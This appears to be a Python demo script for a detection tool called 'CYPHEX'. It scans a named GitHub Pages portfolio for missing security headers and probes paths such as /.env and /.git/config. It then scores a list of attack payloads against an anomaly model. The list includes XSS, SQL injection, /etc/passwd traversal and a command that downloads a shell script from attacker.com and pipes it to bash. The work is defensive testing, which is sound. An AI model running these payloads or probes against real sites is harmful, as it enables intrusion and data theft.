"""
CYPHEX Immune System — LIVE TEST against Vedant's Portfolio
============================================================
Target: https://vedant91.github.io/vedantportfolio/
"""

import asyncio
import sys
import os
import time
import re

os.environ["PYTHONUTF8"] = "1"
os.environ["PYTHONIOENCODING"] = "utf-8"

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "backend", "backend"))

import httpx
from models.scan import ScanContext, FormData, ParamData, Vuln
from immune.behavioral_genome import BehavioralGenome
from immune.mutation_engine import MutationEngine
from immune.evolution_controller import EvolutionController

TARGET = "https://vedant91.github.io/vedantportfolio"

class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; WHITE = "\033[97m"
    BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"
    MAGENTA = "\033[95m"


def header(title, emoji=""):
    print(f"\n{C.CYAN}{'='*70}{C.RESET}")
    print(f"  {emoji}  {C.BOLD}{title}{C.RESET}")
    print(f"{C.CYAN}{'='*70}{C.RESET}\n")


def section(title, emoji=""):
    print(f"\n  {emoji}  {C.BOLD}{C.YELLOW}{title}{C.RESET}")
    print(f"  {C.DIM}{'─'*50}{C.RESET}")


async def phase1_recon() -> dict:
    """Phase 1: Reconnaissance — scan the real target."""
    header("PHASE 1: RECONNAISSANCE", "1")

    info = {
        "url": TARGET,
        "status": None,
        "server": "Unknown",
        "headers": {},
        "tech": [],
        "security_headers": {},
        "pages": [],
    }

    async with httpx.AsyncClient(timeout=15.0, follow_redirects=True, verify=False) as client:
        # Main page
        try:
            resp = await client.get(TARGET)
            info["status"] = resp.status_code
            info["headers"] = dict(resp.headers)
            body = resp.text

            print(f"  {C.GREEN}[{resp.status_code}]{C.RESET} GET {TARGET}")
            print(f"  {C.BOLD}Server:{C.RESET}     {resp.headers.get('server', 'N/A')}")
            print(f"  {C.BOLD}Content:{C.RESET}    {resp.headers.get('content-type', 'N/A')}")
            print(f"  {C.BOLD}Size:{C.RESET}       {len(body):,} bytes")

            info["server"] = resp.headers.get("server", "GitHub Pages")

            # Detect technologies
            if "react" in body.lower() or "reactdom" in body.lower() or "_next" in body:
                info["tech"].append("React/Next.js")
            if "vue" in body.lower():
                info["tech"].append("Vue.js")
            if "angular" in body.lower():
                info["tech"].append("Angular")
            if "github.io" in TARGET:
                info["tech"].append("GitHub Pages (Static)")
            if "font-family" in body:
                info["tech"].append("Custom CSS")
            if "<canvas" in body.lower():
                info["tech"].append("Canvas/Animations")

            print(f"  {C.BOLD}Tech:{C.RESET}       {', '.join(info['tech']) or 'Static HTML'}")

            # Security headers check
            sec_headers = {
                "Content-Security-Policy": "CSP",
                "X-Frame-Options": "Clickjacking Protection",
                "X-Content-Type-Options": "MIME Sniffing",
                "Strict-Transport-Security": "HSTS",
                "X-XSS-Protection": "XSS Filter",
                "Referrer-Policy": "Referrer Policy",
                "Permissions-Policy": "Permissions",
            }

            print(f"\n  {C.BOLD}Security Headers:{C.RESET}")
            missing_count = 0
            for hdr, desc in sec_headers.items():
                val = resp.headers.get(hdr.lower(), None)
                if val:
                    print(f"    {C.GREEN}[OK]{C.RESET}   {hdr}: {val[:60]}")
                    info["security_headers"][hdr] = val
                else:
                    print(f"    {C.RED}[MISS]{C.RESET} {hdr} ({desc})")
                    missing_count += 1

            if missing_count > 0:
                print(f"\n    {C.YELLOW}[!]{C.RESET} {missing_count} security headers missing")

        except Exception as e:
            print(f"  {C.RED}[ERR]{C.RESET} {e}")
            return info

        # Crawl sub-pages
        section("Crawling pages", "")

        paths_to_try = [
            "/", "/index.html", "/about", "/projects", "/contact",
            "/resume", "/skills", "/blog", "/404",
            "/.env", "/.git/config", "/robots.txt", "/sitemap.xml",
            "/admin", "/login", "/api", "/.well-known/security.txt",
        ]

        for path in paths_to_try:
            try:
                url = f"{TARGET}{path}"
                resp = await client.get(url)
                status = resp.status_code

                if status == 200:
                    print(f"    {C.GREEN}[{status}]{C.RESET} {path}")
                    info["pages"].append({"path": path, "status": status, "size": len(resp.text)})

                    # Extract links
                    links = re.findall(r'href="([^"]*)"', resp.text)
                    forms = re.findall(r'<form[^>]*action="([^"]*)"', resp.text)
                    if forms:
                        print(f"      {C.YELLOW}[FORM]{C.RESET} Found forms: {forms}")
                elif status == 404:
                    print(f"    {C.DIM}[{status}]{C.RESET} {path}")
                elif status == 301 or status == 302:
                    loc = resp.headers.get("location", "")
                    print(f"    {C.YELLOW}[{status}]{C.RESET} {path} → {loc[:50]}")
                else:
                    print(f"    {C.YELLOW}[{status}]{C.RESET} {path}")
            except Exception as e:
                print(f"    {C.RED}[ERR]{C.RESET} {path}: {str(e)[:40]}")

    return info


async def phase2_build_genome(recon: dict) -> BehavioralGenome:
    """Phase 2: Build behavioral genome from the discovered data."""
    header("PHASE 2: BUILDING BEHAVIORAL GENOME", "2")

    # Build scan context from recon
    endpoints = [f"{TARGET}{p['path']}" for p in recon["pages"] if p["status"] == 200]

    context = ScanContext(
        target_url=TARGET,
        framework="Static (GitHub Pages)",
        server=recon["server"],
        headers=recon["headers"],
        all_endpoints=endpoints,
        all_forms=[],
        all_params=[],
    )

    # Since it's a static site, simulate potential attack surfaces
    # Even static sites can be attacked via URL params, hash fragments, etc.
    context.all_params = [
        ParamData(url=f"{TARGET}/", name="q", value="search"),
        ParamData(url=f"{TARGET}/", name="ref", value="google"),
    ]

    genome = BehavioralGenome()
    state = genome.build_from_scan(context)

    print(f"  {C.GREEN}[OK]{C.RESET} Genome built with {len(genome.endpoint_profiles)} endpoint profiles")
    print(f"  {C.GREEN}[OK]{C.RESET} Isolation Forest models: {len(genome.endpoint_models)}")

    for key, profile in genome.endpoint_profiles.items():
        print(f"    {C.CYAN}{profile.endpoint[:60]}{C.RESET} ({profile.method})")

    return genome


async def phase3_attack_simulation(genome: BehavioralGenome):
    """Phase 3: Simulate attacks against the genome."""
    header("PHASE 3: ATTACK SIMULATION", "3")

    print(f"  Simulating attacks that an attacker would try against this site...\n")

    attacks = [
        # XSS attempts (common on any site)
        {"payload": "<script>alert(1)</script>", "type": "xss", "desc": "Basic XSS"},
        {"payload": "<img src=x onerror=alert(1)>", "type": "xss", "desc": "IMG XSS"},
        {"payload": "<svg onload=alert(document.cookie)>", "type": "xss", "desc": "SVG XSS"},
        {"payload": "'\"><script>alert('XSS')</script>", "type": "xss", "desc": "Break-out XSS"},
        {"payload": "javascript:alert(1)", "type": "xss", "desc": "JS Protocol XSS"},

        # SQLi attempts (even on static sites, attackers try)
        {"payload": "' OR 1=1--", "type": "sqli", "desc": "Basic SQLi"},
        {"payload": "' UNION SELECT NULL,NULL--", "type": "sqli", "desc": "Union SQLi"},
        {"payload": "admin'; DROP TABLE users;--", "type": "sqli", "desc": "DROP TABLE"},
        {"payload": "1' AND SLEEP(5)--", "type": "sqli", "desc": "Time-based SQLi"},

        # Command injection
        {"payload": "; cat /etc/passwd", "type": "cmdi", "desc": "CMDi Linux"},
        {"payload": "$(curl attacker.com/shell.sh|bash)", "type": "cmdi", "desc": "Shell download"},
        {"payload": "| whoami", "type": "cmdi", "desc": "Pipe CMDi"},

        # Path traversal
        {"payload": "../../../../etc/passwd", "type": "lfi", "desc": "Path Traversal"},
        {"payload": "....//....//etc/shadow", "type": "lfi", "desc": "Double-dot LFI"},

        # Obfuscated attacks
        {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "type": "xss", "desc": "URL-encoded XSS"},
        {"payload": "<ScRiPt>alert(1)</sCrIpT>", "type": "xss", "desc": "Case-mixed XSS"},
        {"payload": "%27%20OR%201%3D1--", "type": "sqli", "desc": "URL-encoded SQLi"},
        {"payload": "' /**/OR/**/1=1--", "type": "sqli", "desc": "Comment SQLi"},

        # Normal traffic (MUST NOT be blocked)
        {"payload": "vedant portfolio", "type": "normal", "desc": "Normal search"},
        {"payload": "cybersecurity projects", "type": "normal", "desc": "Normal search"},
        {"payload": "hello world", "type": "normal", "desc": "Normal text"},
        {"payload": "contact me", "type": "normal", "desc": "Normal text"},
        {"payload": "resume download", "type": "normal", "desc": "Normal text"},
    ]

    ep = list(genome.endpoint_profiles.keys())[0] if genome.endpoint_profiles else TARGET

    correct = 0
    total = len(attacks)
    blocked_attacks = 0
    total_attacks = sum(1 for a in attacks if a["type"] != "normal")
    total_normal = sum(1 for a in attacks if a["type"] == "normal")
    false_positives = 0

    for atk in attacks:
        payload = atk["payload"]
        is_normal = atk["type"] == "normal"

        score = genome.score_request(ep, payload)
        is_blocked = score >= 0.7

        if is_blocked and not is_normal:
            blocked_attacks += 1
        if is_blocked and is_normal:
            false_positives += 1

        if (is_blocked and not is_normal) or (not is_blocked and is_normal):
            correct += 1
            mark = f"{C.GREEN}OK{C.RESET}"
        else:
            mark = f"{C.RED}!!{C.RESET}"

        if is_blocked:
            status = f"{C.GREEN}BLOCKED {C.RESET}"
        else:
            status = f"{C.RED}ALLOWED {C.RESET}" if not is_normal else f"{C.DIM}ALLOWED {C.RESET}"

        bar_len = int(score * 20)
        bar = f"{'█' * bar_len}{'░' * (20 - bar_len)}"
        type_color = {
            "xss": C.RED, "sqli": C.YELLOW, "cmdi": C.MAGENTA,
            "lfi": C.BLUE, "normal": C.DIM,
        }.get(atk["type"], C.WHITE)

        print(f"  {mark} {status} [{bar}] {score:.2f}  {type_color}[{atk['type']:>5}]{C.RESET}  {atk['desc']:20}  {C.DIM}{payload[:35]}{C.RESET}")

    print(f"\n  {C.BOLD}{'─'*55}{C.RESET}")
    print(f"  {C.BOLD}Accuracy:{C.RESET}         {correct}/{total} ({100*correct/total:.0f}%)")
    print(f"  {C.BOLD}Attacks blocked:{C.RESET}  {blocked_attacks}/{total_attacks}")
    print(f"  {C.BOLD}False positives:{C.RESET}  {false_positives}/{total_normal}")

    return correct / total


async def phase4_evolution(genome: BehavioralGenome):
    """Phase 4: Run adversarial co-evolution."""
    header("PHASE 4: ADVERSARIAL CO-EVOLUTION", "4")

    endpoints = list(genome.endpoint_profiles.keys())

    context = ScanContext(
        target_url=TARGET,
        all_endpoints=[TARGET + "/"],
        all_forms=[],
        all_params=[
            ParamData(url=TARGET, name="q", value="test"),
        ],
    )

    controller = EvolutionController()
    results = await controller.run_evolution(
        context,
        generations=10,
        payloads_per_gen=30,
    )

    print(f"\n  {C.BOLD}Evolution Timeline:{C.RESET}")
    for r in results:
        bar_len = int(r.block_rate * 40)
        blocked_bar = f"{C.GREEN}{'█' * bar_len}{C.RESET}"
        bypassed_bar = f"{C.RED}{'█' * (40 - bar_len)}{C.RESET}"
        icon = "🟢" if r.block_rate > 0.8 else "🟡" if r.block_rate > 0.5 else "🔴"
        print(f"    Gen {r.generation:2d} {icon} [{blocked_bar}{bypassed_bar}] "
              f"{r.block_rate:6.1%}  "
              f"{C.GREEN}blocked={r.payloads_blocked}{C.RESET}  "
              f"{C.RED}bypassed={r.payloads_bypassed}{C.RESET}")

    summary = controller.get_evolution_summary()
    print(f"\n  {C.BOLD}Result:{C.RESET}")
    print(f"    {summary['initial_block_rate']:.1%} → {C.GREEN}{summary['final_block_rate']:.1%}{C.RESET}")
    print(f"    Total attacks tested: {summary['total_attacks_tested']}")

    return controller


async def phase5_security_report(recon: dict, accuracy: float):
    """Phase 5: Generate security report."""
    header("PHASE 5: SECURITY POSTURE REPORT", "5")

    missing_headers = []
    sec_headers = [
        "Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options",
        "Strict-Transport-Security", "X-XSS-Protection", "Referrer-Policy",
    ]
    for h in sec_headers:
        if h not in recon.get("security_headers", {}):
            missing_headers.append(h)

    has_https = TARGET.startswith("https://")
    is_static = "Static" in str(recon.get("tech", []))

    # Calculate score
    score = 100
    if missing_headers:
        score -= len(missing_headers) * 5
    if not has_https:
        score -= 20

    # Static sites have inherently smaller attack surface
    if is_static:
        score += 10
        score = min(score, 100)

    print(f"  {C.BOLD}Target:{C.RESET}      {TARGET}")
    print(f"  {C.BOLD}Type:{C.RESET}        {'Static site' if is_static else 'Dynamic app'}")
    print(f"  {C.BOLD}HTTPS:{C.RESET}       {'Yes' if has_https else 'No'}")
    print(f"  {C.BOLD}Server:{C.RESET}      {recon.get('server', 'Unknown')}")
    print(f"  {C.BOLD}Tech Stack:{C.RESET}  {', '.join(recon.get('tech', ['Unknown']))}")

    score_color = C.GREEN if score >= 80 else C.YELLOW if score >= 60 else C.RED
    bar_len = int(score / 100 * 30)
    bar = f"{score_color}{'█' * bar_len}{C.DIM}{'░' * (30 - bar_len)}{C.RESET}"

    print(f"\n  {C.BOLD}Security Posture Score:{C.RESET}")
    print(f"  [{bar}] {score_color}{score}/100{C.RESET}")

    print(f"\n  {C.BOLD}Genome Detection Rate:{C.RESET} {accuracy:.0%}")

    if missing_headers:
        print(f"\n  {C.YELLOW}[RECOMMENDATIONS]{C.RESET}")
        for h in missing_headers:
            print(f"    - Add {C.CYAN}{h}{C.RESET} header")

    if is_static:
        print(f"\n  {C.GREEN}[NOTE]{C.RESET} Static sites (GitHub Pages) have a small attack surface.")
        print(f"         No server-side code = no SQLi, CMDi, or server-side XSS possible.")
        print(f"         The genome still protects against client-side attacks (DOM XSS, phishing).")


async def main():
    os.system("cls" if os.name == "nt" else "clear")

    print(f"""
{C.CYAN}
    ██████╗██╗   ██╗██████╗ ██╗  ██╗███████╗██╗  ██╗
   ██╔════╝╚██╗ ██╔╝██╔══██╗██║  ██║██╔════╝╚██╗██╔╝
   ██║      ╚████╔╝ ██████╔╝███████║█████╗   ╚███╔╝
   ██║       ╚██╔╝  ██╔═══╝ ██╔══██║██╔══╝   ██╔██╗
   ╚██████╗   ██║   ██║     ██║  ██║███████╗██╔╝ ██╗
    ╚═════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{C.RESET}
   {C.BOLD}LIVE SCAN — {TARGET}{C.RESET}
   {C.DIM}Immune System + Security Audit{C.RESET}
""")

    # Check connectivity
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True, verify=False) as client:
            resp = await client.get(TARGET)
            print(f"  {C.GREEN}[OK]{C.RESET} Target is reachable ({resp.status_code})")
    except Exception as e:
        print(f"  {C.RED}[ERR]{C.RESET} Cannot reach target: {e}")
        return

    # Phase 1: Recon
    recon = await phase1_recon()

    # Phase 2: Build genome
    genome = await phase2_build_genome(recon)

    # Phase 3: Attack simulation
    accuracy = await phase3_attack_simulation(genome)

    # Phase 4: Evolution
    controller = await phase4_evolution(genome)

    # Phase 5: Security report
    await phase5_security_report(recon, accuracy)

    header("SCAN COMPLETE", "")
    print(f"  {C.GREEN}CYPHEX Immune System scan finished.{C.RESET}")
    print(f"  {C.DIM}All phases completed. No LLM was used for genome or scoring.{C.RESET}\n")


if __name__ == "__main__":
    asyncio.run(main())
